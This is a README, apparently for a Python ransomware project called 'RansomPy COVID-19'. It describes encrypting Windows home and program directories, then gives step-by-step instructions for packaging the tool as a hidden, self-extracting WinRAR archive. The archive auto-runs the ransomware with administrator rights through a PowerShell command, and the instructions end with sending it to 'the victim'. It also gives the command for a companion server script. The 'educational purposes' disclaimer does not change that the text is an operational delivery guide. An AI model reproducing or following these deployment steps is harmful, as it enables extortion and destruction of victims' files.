# RansomPy COVID-19
Ransowmare based on Python 3

The code is constantly improving, this for educational purposes to learn how a Ransomware works.
I am in no way responsible for what you will do with this code.

# Program Operation 
The code is buildable in several stages but is essentially intended to encrypt the files in a Windows system and is compiled with Cx_Freeze which allows to import all the Ransomware libraries.

Using Cx_Freeze is relatively simple, you can consult the official documentation at this address:
https://cx-freeze.readthedocs.io/en/latest/

You can also execute the code without compiling it, it will be necessary that the target has Python installed on the system, however it is better to compile it for automation after creating an SFX package with Winrar.

# Details
Ransomware does not attack system files, it only encrypts home directories and the directory containing all of the installed programs.

# Auto-exec with WinRAR
1. Select the folder contains the code and libraries 
2. Rename the folder to "setup"
3. Right Click and "Add to archive"
4. Select archive format on "ZIP" 
5. Select "Create SFX Archive"
6. In the "Advanced tab" click on "SFX Options"
7. Select "Create in the current folder"
8. Copy "Powershell Start-Process setup/Ransomware.exe -Verb RunAs" in the "Launch after installation" section.
9. In the "Advanced tab" on "SFX Options" check the box "Request Administrative Rights" (Very important, it allows you to run ransomware as an administrator)
10. In the "Mod tab" on "SFX Options" check the box "Hide Everything" 
11. In the "Update tab" on "SFX Options" check the box "Replace all files"
12. Click OK
13. Send the "SFX Archive" to the victim.

The advantage of this method of building an archive is that I do not need to request privileges in the code and it also makes it possible to contain all the libraries in a single executable file.

# Server Exec
For use the script : python Ransome_server.py <ip_adress> <port_number>
